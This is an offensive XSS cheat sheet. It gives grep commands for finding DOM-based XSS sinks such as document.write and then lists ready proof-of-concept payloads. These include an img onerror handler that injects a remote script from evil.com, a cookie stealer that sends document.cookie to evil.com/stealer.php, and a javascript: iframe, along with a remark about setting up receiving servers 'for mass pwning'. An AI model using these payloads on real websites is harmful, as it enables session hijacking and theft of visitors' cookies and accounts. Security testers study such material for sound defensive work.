# XSS Tips

---
## DOM Based
* Hunting (do this where downloaded JS folder is)
    * Simple `document.write` search:
        ```bash
        grep -r "document.write" ./ --include "*.html"
        ```
    * If the user input is a variable from another js, search the variable with `<VARIABLE>`
        * *note: there could the a space between the variable being assigned and the '=' sign*\
        ```bash
        grep -ER "<VARIABLE>[ ]+=" ./
        ```
## Quick PoC Payloads
* `img` tag to CSRF
```
<img src=a onerror="x=document.createElement('script');x.src='https://evil.com/really_evil.js';document.body.appendChild(x)" />
```
* Class cookie stealer
    * You may setup receiving servers, APIs, webhook for mass pwning
```
<img src=a onerror="location.href='https://evil.com/stealer.php?cookie='+document.cookie;">
```
* iFrame
```
<iframe src="javascript:alert(1)">
```
